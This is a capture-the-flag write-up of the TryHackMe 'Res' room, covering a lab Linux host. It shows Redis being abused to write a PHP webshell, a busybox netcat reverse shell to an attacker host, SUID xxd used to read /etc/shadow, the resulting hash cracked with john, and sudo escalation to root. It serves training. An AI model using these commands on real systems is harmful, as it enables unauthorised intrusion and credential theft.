---
title: "Res"
date: 2025-02-05
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Res
categories: [TryHackMe, Easy]
tags: [linux, dbms, redis, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Res</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/res">https://tryhackme.com/room/res</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Res.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.174.47             
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 04:14 EST
  Nmap scan report for 10.10.174.47
  Host is up (0.043s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  80/tcp   open  http
  6379/tcp open  redis

  Nmap done: 1 IP address (1 host up) scanned in 30.83 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 80,6379 10.10.174.47
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 04:15 EST
  Nmap scan report for 10.10.174.47
  Host is up (0.037s latency).

  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  6379/tcp open  redis   Redis key-value store 6.0.7

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

Since the webserver displayed an `Apache2` default website, I conducted a Gobuster scan, but it didn’t reveal anything useful.

## Port 6379 Analysis

As nmap revealed a `redis` service running on port `6379`, I used the redis cli to connect to the server. Since redis uses a file-based structure, I was able to create a new file. I leveraged this to create a PHP webshell: 

```bash
10.10.3.94:6379> config set dir /var/www/html
	OK
10.10.3.94:6379> config set dbfilename shell.php
	OK
10.10.3.94:6379> set test "<?php system($_GET['cmd']);?>"
	OK
10.10.3.94:6379> save
	OK
```

This allowed me to successfully execute commands on the system:

![Command Execution](/assets/img/tryhackme/Res/thm_res_1.jpg)

Next, I generated a reverse shell using `busybox`:

```bash
http://10.10.3.94/shell.php?cmd=busybox nc [attackerip] 9001 -e sh
```

Netcat received the the reverse shell, after which I stabilized the session. From here I was able to collect the user flag:

```bash
www-data@ubuntu:/var/www/html$ cd /home
www-data@ubuntu:/home$ ls
	vianka
www-data@ubuntu:/home$ cd vianka/
www-data@ubuntu:/home/vianka$ ls
	redis-stable  user.txt
www-data@ubuntu:/home/vianka$ cat user.txt 
	thm{[removed]} 
```

## Privilege Escalation vianka

While performing manual privilege escalation techniques, I discovered an executable with the SUID bit set:

```bash
/usr/bin/xxd
```

I used xxd to read the `shadow` file which gave me the user hash from `vianka`:

```bash
$ LFILE=/etc/shadow
$ xxd "$LFILE" | xxd -r
	vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

On my local machine I created a file, pasted the hash in and ran it with `john` against the `rockyou.txt`:
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[removed]       (vianka)     
1g 0:00:00:00 DONE (2025-02-13 05:02) 10.00g/s 20480p/s 20480c/s 20480C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Using the cracked password, I successfully logged in as `vianka`:
```bash
www-data@ubuntu:/home/vianka$ su vianka 
  Password: 
vianka@ubuntu:~$
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
vianka@ubuntu:~$ sudo -l
[sudo] password for vianka: 
Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

From here I just needed to read the flag:
```bash
vianka@ubuntu:~$ sudo cat /root/root.txt
thm{[removed]}
```

solved! :)